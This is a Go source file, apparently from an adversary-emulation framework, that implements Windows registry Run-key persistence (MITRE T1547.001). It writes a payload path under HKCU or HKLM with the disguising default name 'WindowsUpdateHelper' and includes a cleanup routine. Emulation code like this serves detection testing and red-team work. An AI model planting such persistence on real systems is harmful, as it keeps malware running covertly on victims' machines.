// Package persistence holds techniques that ensure a payload survives
// reboot or user logoff.  Every technique implements sim.Technique and
// sim.Cleaner so it can be composed via the sim package.
package persistence

import (
	"errors"
	"fmt"

	"golang.org/x/sys/windows/registry"
)

// RegistryHive selects the registry root used by RegistryRunKey.
type RegistryHive int

const (
	HKCU RegistryHive = iota // current user; no admin
	HKLM                     // local machine; admin required
)

// RegistryRunKey writes a value under the Run key so the payload runs
// at every user logon.  MITRE T1547.001.
type RegistryRunKey struct {
	Hive        RegistryHive // HKCU (default) or HKLM
	ValueName   string       // default: "WindowsUpdateHelper"
	PayloadPath string       // required: full path written into the value
}

func (r *RegistryRunKey) Name() string  { return "registry-run-key" }
func (r *RegistryRunKey) MITRE() string { return "T1547.001" }

const runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`

func (r *RegistryRunKey) hive() registry.Key {
	if r.Hive == HKLM {
		return registry.LOCAL_MACHINE
	}
	return registry.CURRENT_USER
}

func (r *RegistryRunKey) name() string {
	if r.ValueName == "" {
		return "WindowsUpdateHelper"
	}
	return r.ValueName
}

func (r *RegistryRunKey) Run() error {
	if r.PayloadPath == "" {
		return fmt.Errorf("PayloadPath is required")
	}
	k, _, err := registry.CreateKey(r.hive(), runKeyPath, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("CreateKey: %w", err)
	}
	defer k.Close()
	return k.SetStringValue(r.name(), r.PayloadPath)
}

func (r *RegistryRunKey) Cleanup() error {
	k, err := registry.OpenKey(r.hive(), runKeyPath, registry.SET_VALUE)
	if err != nil {
		return nil // already gone
	}
	defer k.Close()
	if err := k.DeleteValue(r.name()); err != nil && !errors.Is(err, registry.ErrNotExist) {
		return err
	}
	return nil
}
